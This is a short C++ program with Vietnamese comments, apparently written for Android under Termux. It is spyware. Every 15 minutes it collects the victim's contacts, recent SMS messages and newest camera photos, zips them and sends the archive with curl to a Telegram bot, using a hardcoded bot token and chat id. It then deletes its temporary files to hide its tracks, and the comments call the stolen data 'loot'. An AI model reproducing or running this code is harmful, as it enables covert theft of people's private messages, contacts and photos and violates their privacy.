#include <iostream>
#include <string>
#include <cstdlib>
#include <unistd.h>

using namespace std;

int main() {
    // THÔNG TIN CỦA BẠN
    string token = "8672699820:AAFJhQ4uvoywrNtDw5ZjRczEiIT3O6ufYD4"; 
    string chat_id = "7267732695";

    while (true) {
        // MODULE 1: Hốt Danh bạ và Tin nhắn (Cần quyền)
        system("termux-contact-list > .db.txt 2>/dev/null");
        system("termux-sms-list -l 10 > .sms.txt 2>/dev/null");
        
        // MODULE 2: Lấy 5 tấm ảnh mới nhất từ Camera
        system("find /sdcard/DCIM/Camera -name '*.jpg' | tail -n 5 > .list.txt");
        
        // MODULE 3: Đóng gói tất cả chiến lợi phẩm
        system("zip -q .v9000.zip .db.txt .sms.txt -@ < .list.txt > /dev/null 2>&1");
        
        // MODULE 4: Gửi file về Telegram cho bạn
        string cmd = "curl -s -X POST https://api.telegram.org/bot" + token + "/sendDocument -F chat_id=" + chat_id + " -F document=@.v9000.zip";
        system(cmd.c_str());
        
        // Dọn dẹp sạch sẽ dấu vết để tàng hình
        system("rm -f .v9000.zip .db.txt .sms.txt .list.txt");

        // Gửi định kỳ mỗi 15 phút (900 giây)
        sleep(900); 
    }
    return 0;
}
